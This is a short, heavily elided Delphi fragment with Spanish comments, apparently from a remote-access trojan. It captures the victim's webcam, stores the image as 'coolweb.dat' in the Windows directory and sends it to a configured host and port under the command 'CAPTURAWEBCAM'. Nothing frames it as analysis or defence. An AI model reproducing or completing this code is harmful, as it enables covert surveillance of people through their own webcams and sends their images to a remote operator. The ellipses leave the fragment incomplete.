    ...
    begin
      ...
      begin
        ...
        if not FileExists(ParamStr(2)) then
          break; //si yalo borrò entonces se sale dedl for
        Sleep(10);
      end;
...
//                if True = False then
                begin
                  ThreadInfo := TThreadInfo.Create(Configuracion.sHost, Configuracion.iPort,
                    IntToStr(SH), {ExtractFilePath(ParamStr(0)) +} windir + 'coolweb.dat',
                    'CAPTURAWEBCAM', 0);
                  BeginThread(nil,
                    0,
                    Addr(ThreadedTransfer),
                ...
                begin
                  SendText('MSG|No se pudo capturar la webcam.' + ENTER);
//                  Exit;
                  //se sale para no ejecutar las siguientes lineas de codigo, porque el filestream no se creó
                end;
